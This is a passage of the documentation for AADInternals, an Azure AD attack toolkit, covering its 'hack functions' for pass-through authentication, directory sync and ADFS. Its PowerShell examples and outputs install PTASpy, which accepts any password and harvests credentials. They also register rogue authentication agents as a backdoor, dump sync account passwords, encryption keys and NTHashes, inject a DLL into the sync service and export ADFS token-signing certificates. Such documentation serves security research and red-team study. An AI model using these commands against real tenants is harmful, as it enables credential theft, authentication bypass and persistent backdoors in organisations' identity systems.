<pre><code>Are you sure you wan't to install PTASpy to this computer? Type YES to continue or CTRL+C to abort: yes
Installation successfully completed!
All passwords are now accepted and credentials collected to C:\PTASpy\PTASpy.csv
</code></pre>

<h3 id="get-aadintptaspylog">Get-AADIntPTASpyLog (*)</h3>

<p>Since version 0.2.0 <br>
Lists the credentials from C:\PTASpy\PTASPy.csv collected by PTASpy</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Show the PTASpy log</span>
<span class="nb">Get-AADIntPTASpyLog</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>UserName         Password                     Time                
--------         --------                     ----                
user@company.com TQB5AFAAYQBzAHMAdwBvAHIAZAA= 5/22/2019 9:51:43 AM
user@company.com bQBZAHAAQQBTAFMAVwBPAFIARAA= 5/22/2019 9:52:07 AM
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Show the PTASpy log with decoded passwords</span>
<span class="nb">Get-AADIntPTASpyLog</span> <span class="n">-DecodePasswords</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>UserName         Password   Time                
--------         --------   ----                
user@company.com MyPassword 5/22/2019 9:51:43 AM
user@company.com mYpASSWORD 5/22/2019 9:52:07 AM
</code></pre>

<h3 id="remove-aadintptaspy">Remove-AADIntPTASpy (*)</h3>

<p>Since version 0.2.0 <br>
Restarts Microsoft Azure AD Connect Authentication Agent (AzureADConnectAuthenticationAgent) service and removes PTASpy.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Remove PTASpy</span>
<span class="nb">Remove-AADIntPTASpy</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>WARNING: Waiting for service 'Microsoft Azure AD Connect Authentication Agent (AzureADConnectAuthenticationAgent)' to stop...
WARNING: Waiting for service 'Microsoft Azure AD Connect Authentication Agent (AzureADConnectAuthenticationAgent)' to stop...
WARNING: Waiting for service 'Microsoft Azure AD Connect Authentication Agent (AzureADConnectAuthenticationAgent)' to stop...
WARNING: Waiting for service 'Microsoft Azure AD Connect Authentication Agent (AzureADConnectAuthenticationAgent)' to stop...
WARNING: Waiting for service 'Microsoft Azure AD Connect Authentication Agent (AzureADConnectAuthenticationAgent)' to stop...
Service restarted and C:\PTASpy\PTASpy.dll removed.
</code></pre>

<h3 id="register-aadintptaagent-p">Register-AADIntPTAAgent (P)</h3>

<p>Since version 0.2.8 <br>
Registers a PTA agent to Azure AD with given machine name and creates a client certificate or renews existing certificate.
The filename of the certificate is <strong><code>&lt;server FQDN&gt;_&lt;tenant id&gt;_&lt;agent id&gt;_&lt;cert thumbprint&gt;.pfx</code></strong></p>

<p>After the registration, the certificate and name can be used with Microsoft AzureAD Connect PTA agent (<a href="#set-aadintptacertificate">Set-AADIntPTACertificate</a>)</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForPTA</span> <span class="n">-SaveToCache</span>

<span class="c"># Register a PTA agent</span>
<span class="nb">Register-AADIntPTAAgent</span> <span class="n">-MachineName</span> <span class="s2">"server1.company.com"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>PTA Agent (005b136f-db3e-4b54-9d8b-8994f7717de6) registered as server1.company.com
Certificate saved to server1.company.com_513d8d3d-7498-4d8c-85ed-b485ed5c39a9_005b136f-db3e-4b54-9d8b-8994f7717de6_6464A8C05194B416B347D65F01F89FCCE66292FB.pfx
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Update PTA agent certificate</span>
<span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span><span class="nb">Register-AADIntPTAAgent</span> <span class="n">-MachineName</span> <span class="s2">"server1.company.com"</span> <span class="n">-UpdateTrust</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">server1</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com_513d8d3d</span><span class="p">-</span><span class="n">7498</span><span class="p">-</span><span class="n">4d8c</span><span class="p">-</span><span class="n">85ed-b485ed5c39a9_005b136f-db3e</span><span class="p">-</span><span class="n">4b54</span><span class="p">-</span><span class="n">9d8b</span><span class="p">-</span><span class="n">8994f7717de6_6464A8C05194B416B347D65F01F89FCCE66292FB</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>PTA Agent (005b136f-db3e-4b54-9d8b-8994f7717de6) certificate renewed for server1.company.com
Certificate saved to server1.company.com_513d8d3d-7498-4d8c-85ed-b485ed5c39a9_005b136f-db3e-4b54-9d8b-8994f7717de6_449D42C1BA32B23A621EBE62329AE460FE68924B.pfx
</code></pre>

<h3 id="register-aadintsyncagent-p">Register-AADIntSyncAgent (P)</h3>

<p>Since version 0.2.9 <br>
Registers a sync agent to Azure AD with given machine name and creates a client certificate or renews existing certificate.
The filename of the certificate is <strong><code>&lt;server FQDN&gt;_&lt;tenant id&gt;_&lt;agent id&gt;_&lt;cert thumbprint&gt;.pfx</code></strong></p>

<p>After the registration, the certificate and name can be used with Azure AD Connect <a href="https://docs.microsoft.com/en-us/azure/active-directory/cloud-provisioning/what-is-cloud-provisioning" target="_blank">cloud provisioning agent</a>.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForPTA</span> <span class="n">-SaveToCache</span>

<span class="c"># Register a Sync agent</span>
<span class="nb">Register-AADIntPTAAgent</span> <span class="n">-MachineName</span> <span class="s2">"server1.company.com"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Sync Agent (005b136f-db3e-4b54-9d8b-8994f7717de6) registered as server1.company.com
Certificate saved to server1.company.com_513d8d3d-7498-4d8c-85ed-b485ed5c39a9_005b136f-db3e-4b54-9d8b-8994f7717de6_6464A8C05194B416B347D65F01F89FCCE66292FB.pfx
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Update Sync agent certificate</span>
<span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span><span class="nb">Register-AADIntPTAAgent</span> <span class="n">-MachineName</span> <span class="s2">"server1.company.com"</span> <span class="n">-UpdateTrust</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">server1</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com_513d8d3d</span><span class="p">-</span><span class="n">7498</span><span class="p">-</span><span class="n">4d8c</span><span class="p">-</span><span class="n">85ed-b485ed5c39a9_005b136f-db3e</span><span class="p">-</span><span class="n">4b54</span><span class="p">-</span><span class="n">9d8b</span><span class="p">-</span><span class="n">8994f7717de6_6464A8C05194B416B347D65F01F89FCCE66292FB</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Sync Agent (005b136f-db3e-4b54-9d8b-8994f7717de6) certificate renewed for server1.company.com
Certificate saved to server1.company.com_513d8d3d-7498-4d8c-85ed-b485ed5c39a9_005b136f-db3e-4b54-9d8b-8994f7717de6_449D42C1BA32B23A621EBE62329AE460FE68924B.pfx
</code></pre>

<h3 id="set-aadintptacertificate">Set-AADIntPTACertificate (*)</h3>

<p>Since version 0.2.8 <br>
Sets the certificate used by Azure AD Authentication Agent. Can be used to change the name and target tenant of the PTA Agent.
It changes InstanceID and TenantID registry values at “HKLM:\SOFTWARE\Microsoft\Azure AD Connect Agents\Azure AD Connect Authentication Agent”,
and the certificate thumbprint at “$env:ProgramData\Microsoft\Azure AD Connect Authentication Agent\Config\TrustSettings.xml”.
It also imports the certificate to “Cert:\LocalMachine\My” and gives the “Network Service” read access to it’s private key.
Together with PTASpy allows using a standalone server as a backdoor.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForPTA</span> <span class="n">-SaveToCache</span>

<span class="c"># Register a PTA agent</span>
<span class="nb">Register-AADIntPTAAgent</span> <span class="n">-MachineName</span> <span class="s2">"server1.company.com"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>PTA Agent (005b136f-db3e-4b54-9d8b-8994f7717de6) registered as server1.company.com
Certificate saved to server1.company.com_513d8d3d-7498-4d8c-85ed-b485ed5c39a9_005b136f-db3e-4b54-9d8b-8994f7717de6_6464A8C05194B416B347D65F01F89FCCE66292FB.pfx
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Change the PTA certificate</span>
<span class="nb">Set-AADIntPTACertificate</span> <span class="n">-PfxFileName</span> <span class="n">server1</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com_513d8d3d</span><span class="p">-</span><span class="n">7498</span><span class="p">-</span><span class="n">4d8c</span><span class="p">-</span><span class="n">85ed-b485ed5c39a9_005b136f-db3e</span><span class="p">-</span><span class="n">4b54</span><span class="p">-</span><span class="n">9d8b</span><span class="p">-</span><span class="n">8994f7717de6_6464A8C05194B416B347D65F01F89FCCE66292FB</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>Certification information set, remember to restart the service.
</code></pre>

<h3 id="get-aadintproxyagents-p">Get-AADIntProxyAgents (P)</h3>

<p>Since version 0.2.9 <br>
This function shows the list of MS App Proxy authentication (PTA) and provisioning (Azure AD Connect cloud provisioning) agents.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nv">$pt</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForPTA</span>

<span class="c"># List the proxy agents</span>
<span class="nb">Get-AADIntProxyAgents</span> <span class="n">-AccessToken</span> <span class="nv">$pt</span> <span class="p">|</span> <span class="nb">ft</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>id                                   machineName         externalIp     status   supportedPublishingTypes
--                                   -----------         ----------     ------   ------------------------
51f3afd9-685b-413a-aafa-bab0d556ea4b this.is.a.fake      67.35.155.73   active   {authentication}        
51a061a0-968d-48b8-951e-5ae9d9a0441f server1.company.com 93.188.31.116  inactive {authentication}        
49c9ad46-c067-42f6-a678-dfd938c27789 server2.company.com 102.20.104.213 inactive {provisioning} 
</code></pre>

<h3 id="get-aadintproxyagentgroups-p">Get-AADIntProxyAgentGroups (P)</h3>

<p>Since version 0.2.9 <br>
This function shows the list of MS App Proxy authentication groups of (PTA) and provisioning (Azure AD Connect cloud provisioning) agents.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nv">$pt</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForPTA</span>

<span class="c"># List the proxy agents</span>
<span class="nb">Get-AADIntProxyAgentGroups</span> <span class="n">-AccessToken</span> <span class="nv">$pt</span> <span class="p">|</span> <span class="nb">ft</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>TenantId                    : ea664074-37dd-4797-a676-b0cf6fdafcd4
ConfigurationDisplayName    : company.com
ConfigurationResourceName   : company.com
ConfigurationPublishingType : provisioning
id                          : 4b6ffe82-bfe2-4357-814c-09da95399da7
displayName                 : Group-company.com-42660f4a-9e66-4a08-ac17-2a2e0d8b993e
publishingType              : provisioning
isDefault                   : False
</code></pre>

<h3 id="export-aadintproxyagentcertificates">Export-AADIntProxyAgentCertificates</h3>

<p>Since version 0.6.9 <br>
Export certificates of all MS App Proxy agents from the local computer.
The filename of the certificate is <strong><code>&lt;server FQDN&gt;_&lt;tenant id&gt;_&lt;agent id&gt;_&lt;cert thumbprint&gt;.pfx</code></strong></p>

<p><strong>Note:</strong> This function elevates the current PowerShell session to SYSTEM. To export bootstraps, open a new PowerShell session and use <a href="#export-aadintproxyagentbootstraps">Export‑AADIntProxyAgentBootstraps</a>.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export certificates</span>
<span class="nb">Export-AADIntProxyAgentCertificates</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>WARNING: Elevating to LOCAL SYSTEM. You MUST restart PowerShell to restore PTA01\Administrator rights.

Certificate saved to: PTA01.company.com_ea664074-37dd-4797-a676-b0cf6fdafcd4_4b6ffe82-bfe2-4357-814c-09da95399da7_A3457AEAE25D4C513BCF37CB138628772BE1B52.pfx
</code></pre>

<h3 id="export-aadintproxyagentbootstraps">Export-AADIntProxyAgentBootstraps</h3>

<p>Since version 0.7.8 <br></p>

<p>Export bootstraps of the given certificates.
The filename of the bootstrap is same than the given certificate with .xml extension.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export bootstrap</span>
<span class="nb">Export-AADIntProxyAgentBootstraps</span> <span class="n">-Certificates</span> <span class="s2">"PTA01.company.com_ea664074-37dd-4797-a676-b0cf6fdafcd4_4b6ffe82-bfe2-4357-814c-09da95399da7_A3457AEAE25D4C513BCF37CB138628772BE1B52.pfx"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Bootstrap saved to: PTA01.company.com_ea664074-37dd-4797-a676-b0cf6fdafcd4_4b6ffe82-bfe2-4357-814c-09da95399da7_A3457AEAE25D4C513BCF37CB138628772BE1B52.xml
</code></pre>

<h2 id="hack-functions-directory-synchronization">Hack functions: Directory Synchronization</h2>

<h3 id="set-aadintpasswordhashsyncenabled-a">Set-AADIntPasswordHashSyncEnabled (A)</h3>

<p>Since version 0.1.6 <br>
This function enables or disabled password hash synchronization (PHS).</p>

<p>This can be used to turn on PHS so that passwords can be set using <a href="#set-aadintuserpassword-a">Set-AADIntUserPassword</a>.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Enable PHS</span>
<span class="nb">Set-AADIntPasswordHashSyncEnabled</span> <span class="n">-Enable</span> <span class="nv">$true</span>
</code></pre></div>
<p></p>

<h3 id="new-aadintguestinvitation-z">New-AADIntGuestInvitation (Z)</h3>

<p>This function invites a guest user to tenant. Does not require admin rights, as long as access to Azure Portal is allowed. Basically, this function allows every
member of the tenant to invite guest users to the tenant.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the auth token. Supports also external users (outlook.com, etc.)</span>
<span class="nv">$zt</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForAADIAMAPI</span> <span class="n">-Credentials</span> <span class="p">(</span><span class="nb">Get-Credential</span><span class="p">)</span>
<span class="c"># Get login information for a domain</span>
<span class="nb">New-AADIntGuestInvitation</span> <span class="n">-AuthToken</span> <span class="nv">$zt</span> <span class="n">-EmailAddress</span> <span class="s2">"someone@outlook.com"</span> <span class="n">-Message</span> <span class="s2">"Welcome to our tenant!"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>accountEnabled                        : True
usageLocation                         : 
mailNickname                          : someone_outlook.com#EXT#
passwordProfile                       : 
rolesEntity                           : 
selectedGroupIds                      : 
streetAddress                         : 
city                                  : 
state                                 : 
country                               : 
telephoneNumber                       : 
mobile                                : 
physicalDeliveryOfficeName            : 
postalCode                            : 
authenticationPhoneNumber             : 
authenticationAlternativePhoneNumber  : 
authenticationEmail                   : 
strongAuthenticationDetail            : @{verificationDetail=}
defaultImageUrl                       : 
ageGroup                              : 
consentProvidedForMinor               : 
legalAgeGroupClassification           : 
objectId                              : e250c8f5-3ff3-4eea-9d68-cff019fa850e
objectType                            : User
displayName                           : someone
userPrincipalName                     : someone_outlook.com#EXT#@company.onmicrosoft.com
thumbnailPhoto@odata.mediaContentType : 
givenName                             : 
surname                               : 
mail                                  : someone@outlook.com
dirSyncEnabled                        : 
alternativeSecurityIds                : {}
signInNamesInfo                       : {}
signInNames                           : {someone_outlook.com#EXT#@company.onmicrosoft.com}
ownedDevices                          : 
jobTitle                              : 
department                            : 
displayUserPrincipalName              : 
hasThumbnail                          : False
imageUrl                              : 
imageDataToUpload                     : 
source                                : 
sources                               : 
sourceText                            : 
userFlags                             : 
deletionTimestamp                     : 
permanentDeletionTime                 : 
alternateEmailAddress                 : 
manager                               : 
userType                              : Guest
isThumbnailUpdated                    : 
isAuthenticationContactInfoUpdated    : 
searchableDeviceKey                   : {}
displayEmail                          : 
creationType                          : Invitation
userState                             : PendingAcceptance
otherMails                            : {someone@outlook.com}
</code></pre>

<h3 id="get-aadintsynccredentials">Get-AADIntSyncCredentials (*)</h3>

<p>Since version 0.1.8 <br>
This function extracts Azure AD Connect credentials to AD and Azure AD from WID database.</p>

<p>By default (since v0.8.1), exports credentials from the local computer by starting a background process.
This doesn’t elevate the current PS session.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get Azure AD Connect credentials</span>
<span class="nb">Get-AADIntSyncCredentials</span>
</code></pre></div>
<p></p>

<p><strong>Output 1:</strong></p>

<pre><code>Name                           Value
----                           -----
AADUser                        Sync_SRV01_4bc4a34e95fa@company.onmicrosoft.com                                                      
AADUserPassword                $.1%(lxZ&amp;/kNZz[r
ADDomain1                      company.com  
ADUser1                        MSOL_4bc4a34e95fa
ADUserPassword1                Q9@p(poz{#:kF_G)(s/Iy@8c*9(t;...
ADDomain2                      business.net  
ADUser2                        MSOL_4bc4a34e95fa
ADUserPassword2                cE/Pj+4/MR6hW)2L_4P=H^hiq)pZhMb...
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get Azure AD Connect credentials as PSCredential objects</span>
<span class="nv">$synccredentials</span> <span class="p">=</span> <span class="nb">Get-AADIntSyncCredentials</span> <span class="n">-AsCredentials</span>

<span class="c"># Get access token</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-Credentials</span> <span class="nv">$synccredentials</span><span class="p">[</span><span class="n">0</span><span class="p">]</span> <span class="n">-SaveToCache</span>
</code></pre></div>
<p></p>

<p><strong>Output 2:</strong></p>

<pre><code>Tenant                               User                                            Resource                  Client               
------                               ----                                            --------                  ------               
a5427106-ed71-4185-9481-221e2ebdfc6c Sync_SRV01_4bc4a34e95fa@company.onmicrosoft.com https://graph.windows.net 1b730954-1685-4b74...
</code></pre>

<h3 id="update-aadintsynccredentials">Update-AADIntSyncCredentials (*)</h3>

<p>Since version 0.1.8 <br>
This function resets Azure AD Connect credentials to Azure AD and stores it to Azure AD Connect configuration database.</p>

<p><strong>Note:</strong> This function “elevates” the session to ADSync user. You MUST restart PowerShell to restore original rights.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the current Azure AD Connect credentials</span>
<span class="nb">Get-AADIntSyncCredentials</span>
<span class="c"># Save credentials to a variable</span>
<span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">Get-Credential</span> <span class="n">-Message</span> <span class="s2">"O365"</span> <span class="n">-UserName</span> <span class="s2">"Sync_SRV01_4bc4a34e95fa@company.onmicrosoft.com"</span>

<span class="c"># Get Access Token</span>
<span class="nv">$Token</span><span class="p">=</span><span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-Credentials</span> <span class="nv">$Cred</span>

<span class="c"># Update Azure AD Connect credentials for Azure AD</span>
<span class="nb">Update-AADIntSyncCredentials</span> <span class="n">-AccessToken</span> <span class="nv">$Token</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Password successfully updated to Azure AD and configuration database!

Name                           Value
----                           -----
AADUser                        Sync_SRV01_4bc4a34e95fa@company.onmicrosoft.com                                                   
AADUserPassword                Y%C(]u%Rq;en-P;^
ADDomain1                      company.com  
ADUser1                        MSOL_4bc4a34e95fa
ADUserPassword1                Q9@p(poz{#:kF_G)(s/Iy@8c*9(t;...

Remember to restart the sync service: Restart-Service ADSync
</code></pre>

<h3 id="get-aadintsyncencryptionkeyinfo">Get-AADIntSyncEncryptionKeyInfo (*)</h3>

<p>Since version 0.3.0 <br>
This function extracts Entropy and InstanceID from the local ADSync configuration database.
Returned information can be used with <a href="#get-aadintsyncencryptionkey">Get-AADIntSyncEncryptionKey</a>.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the ADSync encryption key info</span>
<span class="nb">Get-AADIntSyncEncryptionKeyInfo</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Name                           Value                                                                                                                                            
----                           -----                                                                                                                                            
InstanceId                     299b1d83-9dc6-479a-92f1-2357fc5abfed                                                                                                             
Entropy                        a1c80460-6fe9-4c6f-bf31-d7a34c878dca
</code></pre>

<h3 id="get-aadintsyncencryptionkey">Get-AADIntSyncEncryptionKey (*)</h3>

<p>Since version 0.3.0 <br>
Gets ADSync encryption key using the given entropy and instance id. These can be read from the database or using <a href="#get-aadintsyncencryptionkeyinfo">Get-AADIntSyncEncryptionKeyInfo</a>.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the key information</span>
<span class="nv">$key_info</span> <span class="p">=</span> <span class="nb">Get-AADIntSyncEncryptionKeyInfo</span>

<span class="c"># Get the ADSync encryption key </span>
<span class="nb">Get-AADIntSyncEncryptionKey</span> <span class="n">-Entropy</span> <span class="nv">$key_info</span><span class="p">.</span><span class="n">Entropy</span> <span class="n">-InstanceId</span> <span class="nv">$key_info</span><span class="p">.</span><span class="n">InstanceId</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Id     Guid                                 CryptAlg Key                   
--     ----                                 -------- ---                   
100000 299b1d83-9dc6-479a-92f1-2357fc5abfed    26128 {4, 220, 54, 13...}
</code></pre>

<h3 id="get-aadintusernthash">Get-AADIntUserNTHash</h3>

<p>Since version 0.9.0 <br></p>

<p>Exports and decrypts the NTHashes from Azure AD using the given application and certificate.</p>

<p>The application must be “Azure AD Domain Services Sync” created during the Azure AD Domain services (AADDS) deployment. Either client certificate or password needs to be provided.</p>

<p>The encryption certificate needs to be exported from AADDS domain controller.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export NTHashes</span>
<span class="nb">Get-AADIntUserNTHash</span> <span class="n">-ClientPassword</span> <span class="s2">"vlb8Q~W8iVXwfdt2FjIH4FE0hRc-p9G_kyN_KbtZ"</span> <span class="n">-ClientId</span> <span class="s2">"23857e6f-7be4-4bb8-84b7-22e92c359c8d"</span> <span class="n">-PfxFileName</span> <span class="s2">".\encryption_cert.pfx"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>NTHash                           UserPrincipalName                  
------                           -----------------                  
00000000000000000000000000000000 user1@company.com
11111111111111111111111111111111 user2@company.com
</code></pre>

<h3 id="install-aadintforcenthash">Install-AADIntForceNTHash</h3>

<p>Since version 0.9.3 <br></p>

<p>Installs ForceNTHash to the current computer.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Install ForceNTHash</span>
<span class="nb">Install-AADIntForceNTHash</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Are you sure you wan't to install ForceNTHash to this computer? Type YES to continue or CTRL+C to abort: yes
WARNING: Waiting for service 'Microsoft Azure AD Sync (ADSync)' to stop...
WARNING: Waiting for service 'Microsoft Azure AD Sync (ADSync)' to stop...
WARNING: Waiting for service 'Microsoft Azure AD Sync (ADSync)' to stop...
WARNING: Waiting for service 'Microsoft Azure AD Sync (ADSync)' to start...
WARNING: Waiting for service 'Microsoft Azure AD Sync (ADSync)' to start...
WARNING: Sleeping for five seconds..
Injecting C:\Program Files\WindowsPowerShell\Modules\AADInternals\0.9.3\ForceNTHash.dll to process 9760
Trying to find Patch from C:\Program Files\WindowsPowerShell\Modules\AADInternals\0.9.3\ForceNTHash.dll
Function Patch executed successfully
DLL injected successfully

Installation successfully completed!
Windows legacy credentials sync is now enforced and credentials are encrypted with ForceNTHash certificate.
</code></pre>

<h3 id="remove-aadintforcenthash">Remove-AADIntForceNTHash</h3>

<p>Since version 0.9.3 <br></p>

<p>Removes ForceNTHash from the current computer</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Remove ForceNTHash</span>
<span class="nb">Remove-AADIntForceNTHash</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>WARNING: Waiting for service 'Microsoft Azure AD Sync (ADSync)' to start...
WARNING: Waiting for service 'Microsoft Azure AD Sync (ADSync)' to start...
WARNING: Waiting for service 'Microsoft Azure AD Sync (ADSync)' to start...
Service restarted and ForceNTHash removed.
</code></pre>

<h3 id="initialize-aadintfullpasswordsync">Initialize-AADIntFullPasswordSync</h3>

<p>Since version 0.9.3 <br></p>

<p>Enforces password hash sync of all users.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Enforce password hash sync</span>
<span class="nb">Initialize-AADIntFullPasswordSync</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Full password sync enforced
</code></pre>

<h2 id="hack-functions-adfs">Hack functions: ADFS</h2>

<h3 id="new-aadintadfsselfsignedcertificates">New-AADIntADFSSelfSignedCertificates (*)</h3>

<p>Since version 0.2.3 <br>
Disables certificate auto rollover and creates new self-signed Token Signing and Token Decrypt certificates for ADFSService.
The created certificates are copies of existing certificates, except that they are valid for 10 years.
Certificates are added to ADFS and the service is restarted. Certificates are also exported to the current directory.</p>

<p>Default password for exported .pfx files is “AADInternals”</p>

<p><strong>Note!</strong> If there are multiple ADFS servers, certificates MUST be imported to each server’s Local Machine Personal store and
read access to private keys for the ADFS service accounts must be assigned. Also, the ADFS service needs to be restarted.</p>

<p><strong>Don’t forget to update certificate information to Azure AD using <a href="#update-aadintadfsfederationsettings-a">Update-AADIntADFSFederationSettings</a></strong></p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Create new certificates</span>
<span class="nb">New-AADIntADFSSelfSignedCertificates</span>
</code></pre></div>
<p></p>

<h3 id="restore-aadintadfsautorollover">Restore-AADIntADFSAutoRollover (*)</h3>

<p>Since version 0.2.3 <br>
Restores ADFS to “normal” mode: Token Signing and Token Decryption certificates are automatically rolled over once a year.
Enables certificate auto rollover, updates Token Signing and Token Decryption certificates and removes the old self-signed certificates.</p>

<p><strong>Note!</strong> If there are multiple ADFS servers the ADFS service needs to be restarted on each server.</p>

<p><strong>Don’t forget to update certificate information to Azure AD using <a href="#update-aadintadfsfederationsettings-a">Update-AADIntADFSFederationSettings</a></strong></p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Restore the auto rollover mode</span>
<span class="nb">Restore-AADIntADFSAutoRollover</span>
</code></pre></div>
<p></p>

<h3 id="update-aadintadfsfederationsettings-a">Update-AADIntADFSFederationSettings (A)</h3>

<p>Since version 0.2.3 <br>
Updates federation information of the given domain to match the local ADFS server information.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Update federation setting for domain company.com</span>
<span class="nb">Update-AADIntADFSFederationSettings</span> <span class="n">-Domain</span> <span class="n">company</span><span class="p">.</span><span class="n">com</span>
</code></pre></div>
<p></p>

<h3 id="export-aadintadfscertificates">Export-AADIntADFSCertificates (*)</h3>

<p>Since version 0.4.7 <br>
Exports current and additional (next) AD FS token signing and encryption certificates to local directory. The exported certificates do not have passwords.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export ADFS certificates from the local AD FS server</span>
<span class="nb">Export-AADIntADFSCertificates</span>
</code></pre></div>
<p></p>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export configuration remotely and store to variable</span>
<span class="nv">$ADFSConfig</span> <span class="p">=</span> <span class="nb">Export-AADIntADFSConfiguration</span> <span class="n">-Hash</span> <span class="s2">"6e36047d34057fbb8a4e0ce8933c73cf"</span> <span class="n">-SID</span> <span class="s2">"S-1-5-21-1332519571-494820645-211741994-8710"</span> <span class="n">-Server</span> <span class="n">sts</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com</span>

<span class="c"># Export encryption key remotely and store to variable</span>
<span class="nv">$ADFSKey</span> <span class="p">=</span> <span class="nb">Export-AADIntADFSEncryptionKey</span> <span class="n">-Server</span> <span class="n">dc</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com</span> <span class="n">-Credentials</span> <span class="nv">$cred</span> <span class="n">-ObjectGuid</span> <span class="s2">"930e004a-4486-4f58-aead-268e41c0531e"</span>

<span class="c"># Export ADFS certificates</span>
